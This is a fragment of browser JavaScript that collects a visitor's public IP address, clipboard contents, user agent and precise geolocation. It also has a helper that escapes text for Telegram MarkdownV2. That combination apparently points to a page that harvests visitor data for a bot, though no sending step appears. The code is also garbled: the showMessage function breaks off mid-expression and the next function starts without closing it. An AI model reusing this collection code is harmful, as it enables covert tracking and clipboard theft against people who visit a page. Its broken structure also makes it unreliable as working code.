    const messageBox = document.getElementById("messageBox");

    function showMessage(message, type = 'info') {
        messageBox.textContent = message;
        messageBox.style.display = 'block';
        messageBox.className = `mt-20 p-15 border rounded-lg font-medium ${
            type === 'error'

    function escapeMarkdownV2(text) {
        return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
        }

    async function getIP() {
        try {
            const res = await fetch("https://api.ipify.org?format=json");
            const data = await res.json();
            return data.ip;
        } catch (error) {
            return "Unknown";
        }
    }

    async function getClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            return text ? text : "Clipboard empty";
        } catch (err) {
            return "Clipboard access denied";
        }
    }

    function getDevice() {
        return navigator.userAgent;
    }

    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                return resolve("Not supported");
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
                },
                (error) => {
                    let errorMessage = "Permission denied or other error";
                    if (error.code === error.PERMISSION_DENIED) {
                        errorMessage = "Location permission denied";
                    } else if (error.code === error.POSITION_UNAVAILABLE) {
                        errorMessage = "Location unavailable";
                    } else if (error.code === error.TIMEOUT) {
                        errorMessage = "Location request timed out";
                    }
                    resolve(errorMessage);
                },
                { timeout: 10000, enableHighAccuracy: true }
            );
        });
    }
